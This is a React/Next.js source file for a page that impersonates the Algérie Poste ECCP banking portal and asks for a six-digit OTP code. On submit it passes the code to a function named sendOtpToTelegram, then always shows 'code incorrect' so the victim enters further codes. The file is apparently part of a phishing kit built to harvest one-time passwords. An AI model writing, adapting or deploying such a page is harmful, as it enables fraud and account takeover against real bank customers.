"use client"

import type React from "react"
import { Menu } from "lucide-react"
import Image from "next/image"
import { useState, useRef } from "react"
import { sendOtpToTelegram } from "../actions"

export default function OtpPage() {
  const [otp, setOtp] = useState(["", "", "", "", "", ""])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const handleInputChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/[^0-9]/g, "")

    if (numericValue.length > 1) {
      return
    }

    const newOtp = [...otp]
    newOtp[index] = numericValue

    setOtp(newOtp)

    if (numericValue && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")

    const otpString = otp.join("")

    if (otpString.length !== 6) {
      setError("Veuillez entrer les 6 chiffres")
      return
    }

    setLoading(true)

    try {
      await sendOtpToTelegram(otpString)
      setError("Code OTP incorrect. Veuillez réessayer.")
    } catch (error) {
      setError("Une erreur s'est produite")
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100 font-sans">
      {/* Header */}
      <header className="bg-blue-900 text-white px-6 py-4 flex items-center justify-between">
        <div className="w-16 h-16 flex items-center justify-center">
          <Image src="/logo.png" alt="ECCP Algérie Poste" width={64} height={64} priority />
        </div>
        <button className="text-yellow-400 hover:text-yellow-300">
          <Menu size={32} />
        </button>
      </header>

      {/* Main Content */}
      <main className="max-w-2xl mx-auto px-6 py-12">
        {/* Title Section */}
        <div className="mb-12">
          <h1 className="text-3xl font-bold text-blue-900 mb-2 font-sans">ECCP - ALGÉRIE POSTE</h1>
          <div className="h-1 bg-yellow-400 w-full mb-8"></div>
          <h2 className="text-xl font-semibold text-gray-800 font-sans">ENTREZ VOTRE CODE OTP</h2>
        </div>

        {/* OTP Form Container */}
        <div className="bg-gray-200 border-4 border-blue-900 rounded-3xl p-8 mb-12">
          <div className="mb-8 p-4 bg-blue-50 border-l-4 border-blue-900 rounded">
            <p className="text-gray-800 font-sans text-sm">
              Veuillez vérifier votre numéro de téléphone pour recevoir le code OTP.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            {/* OTP Inputs */}
            <div>
              <label className="block text-gray-800 font-semibold mb-6 font-sans">Code OTP (6 chiffres)</label>
              <div className="flex gap-3 justify-center">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => {
                      inputRefs.current[index] = el
                    }}
                    type="text"
                    value={digit}
                    onChange={(e) => handleInputChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    maxLength={1}
                    inputMode="numeric"
                    className="w-14 h-14 px-2 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans text-center text-2xl font-bold"
                  />
                ))}
              </div>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-900 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-800 transition-colors mt-8 font-sans disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? "Vérification..." : "Valider"}
            </button>

            {error && <div className="text-center font-sans text-red-600 font-semibold">{error}</div>}
          </form>
        </div>
      </main>
    </div>
  )
}
